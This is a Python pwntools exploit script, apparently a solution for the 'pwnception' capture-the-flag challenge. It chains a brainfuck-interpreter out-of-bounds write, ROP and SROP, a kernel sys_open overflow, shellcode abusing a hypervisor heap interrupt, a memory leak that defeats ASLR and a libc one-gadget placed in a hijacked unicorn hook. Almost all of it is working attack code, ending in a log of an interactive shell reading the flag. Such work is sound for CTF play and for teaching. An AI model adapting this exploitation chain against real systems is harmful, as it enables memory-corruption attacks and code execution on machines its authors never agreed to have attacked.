#!/usr/bin/env python3
# pylint: skip-file

from pwn import *

"""
Bugs:
* The bf interpreter has no bounds checking at all allowing the data pointer to be increased past the end of the buffer leading to ROP.
* The kernel has a buffer overflow in sys_open as it will keep copying until a null byte is found
* The hypervisor has an extra `int 0x71` handler allowing for mallocing a buffer, reading/writing to it and freeing it with no bounds checking
"""

pop_rax = 0x400121  #: pop rax; ret;
syscall = 0x400cf2  # : syscall; ret;


def exploit():
    
    prog = b"[111111111111111111111111111111111111111111111111111111111111111" + \
        p64(0xffff8801ffffe018) + b"\x8C\x00" + p64(0x12345678) + b"]+[->>>>>>>>,]>>>>>>>>>>>>>>>>>>>>" + b",>"*0x100 + b"!"
    p.sendafter("end with a !):", prog)

    payload = b""

    # use rop to setup srop sys_open call to trigger kernel bug
    payload += b"\x01" * 0x1ff
    payload += b"\x00"
    payload += b"gggg"
    payload += p64(pop_rax)
    payload += p64(15)
    payload += p64(syscall)

    srop = SigreturnFrame()
    srop.rip = syscall
    srop.rax = constants.SYS_open
    srop.rdi = 0x6010a0
    srop.rsp = 0x6010a0

    payload += bytes(srop)

    p.send(payload)
    sleep(1)
    payload2 = b""
    payload2 += b"A" * 0x34

    mov_rdi_rsi_write = 0xffffffff81000082  # : mov rsi, rdi; mov dx, 0x38f; rep outsb dx, byte ptr [rsi]; ret
    mov_rsi_rax = 0x40025f  # mov rsi, rax; mov edi, 0; call 0x9b0; leave; ret;
    int_70 = 0xFFFFFFFF810001DB  # int 0x70
    mov_rdi_rsi_read = 0xffffffff8100008f  # : mov rsi, rdi; mov dx, 0x38f; rep insb dx, byte ptr [rsi]; ret

    # mmap addr 0x0 to be rwx
    payload2 += p64(0x11111111)
    payload2 += p64(pop_rax)
    payload2 += p64(0x10000)
    payload2 += p64(mov_rsi_rax)  # mov rsi, rax; mov edi, 0; call 0x9b0; leave; ret;
    payload2 += p64(0x22222222)  # rbp
    payload2 += p64(pop_rax)  # rip
    payload2 += p64(9)
    payload2 += p64(int_70)

    # read our payload into addr 0x0
    payload2 += p64(mov_rdi_rsi_read)

    # jump to 0x0
    payload2 += p64(0)

    payload2 = payload2.ljust(0x38f-20, b"B")
    p.send(payload2)
    pause(1)

    
    # malloc(0x10), copies 0x1000 bytes from it and prints for leaks
    # then reads 0x200 bytes in to it 
    shellcode = b"\x90"*8
    shellcode += asm("""

    mov rax, 0
    mov rdi, 0x10
    int 0x71

    mov rax, 2
    mov rdi, 0x4000
    mov rsi, 0x1000
    int 0x71

    mov rcx, 0x1000
    mov rsi, 0x4000
    mov dx, 0x38f
    rep outsb

    mov rcx, 0x3000
	mov rdi, 0x1000
	mov dx, 0x38f
	rep insb

    mov rax, 1
    mov rdi, 0x1000
    mov rsi, 0x200
    int 0x71
    
    mov rcx, 0x1000
	mov rdi, 0x3000
	mov dx, 0x38f
	rep insb

    hlt
    """)

    shellcode = shellcode.ljust(0x38f, b"\x90")
    p.send(shellcode)
    pause(1)

    p.recvuntil("cannot be opened\n")
    dump = p.recvn(0x1000)
    leak = u64(dump[0x20:0x28]) - 0x40
    log.info("payload at: 0x{:x}".format(leak))

    unicorn_leak = u64(dump[0x98:0xa0]) - 0x1b406
    log.info("unicorn_leak at: 0x{:x}".format(unicorn_leak))

    libc = unicorn_leak - 0x610000
    log.info("libc at: 0x{:x}".format(libc))

    magic = libc + 0x4f3d5
    log.info("magic at: 0x{:x}".format(magic))

    call_rbp_10 = 0x000000000001de48  # : mov rax, qword ptr [rbp - 0x10]; mov rax, qword ptr [rax]; call rax;
    log.info("call_rbp_10 at: 0x{:x}".format(unicorn_leak + call_rbp_10))

    payload3 = b""
    payload3 += b"\x00" * 0x20

    # overflows into unicorn hook allowing is to rewrite it. Magic gadget doesn't quite line up so link it with
    # another call

    payload3 += p64(magic)  # next
    payload3 += p64(leak + 0x30)  # data

    # fake hook structure
    payload3 += p32(0x2)
    payload3 += p32(0xda)   # type
    payload3 += p32(0x1)
    payload3 += p32(0x0)    # delete
    payload3 += p64(0x1)
    payload3 += p64(0x0)
    payload3 += p64(unicorn_leak + call_rbp_10) # hook function
    payload3 += p64(0)

    payload3 += p64(0)
    payload3 += p64(0)

    payload3 = payload3.ljust(0x3000, b"\x00")
    p.send(payload3)

    p.interactive()


if __name__ == "__main__":
    name = "./userland"
    binary = ELF(name, checksec=False)
    context.terminal = ["tmux", "sp", "-h"]
    context.arch = "amd64"

    if len(sys.argv) > 1:
        p = remote("pwnception.chal.perfect.blue", 1)
    else:
        p = process(["./main", "./kernel", "./userland"], env={}, stderr=False)
        gdb.attach(p, """
        c
        """)

    exploit()

"""
[+] Opening connection to pwnception.chal.perfect.blue on port 1: Done
[+] Waiting: Done
[+] Waiting: Done
[*] payload at: 0x7f412c011730
[*] unicorn_leak at: 0x7f4135966000
[*] libc at: 0x7f4135356000
[*] magic at: 0x7f41353a53d5
[*] call_rbp_10 at: 0x7f4135983e48
[*] Switching to interactive mode
$ cat /flag.txt
pbctf{pwn1n6_fr0m_th3_b0770m_t0_th3_t0p}
"""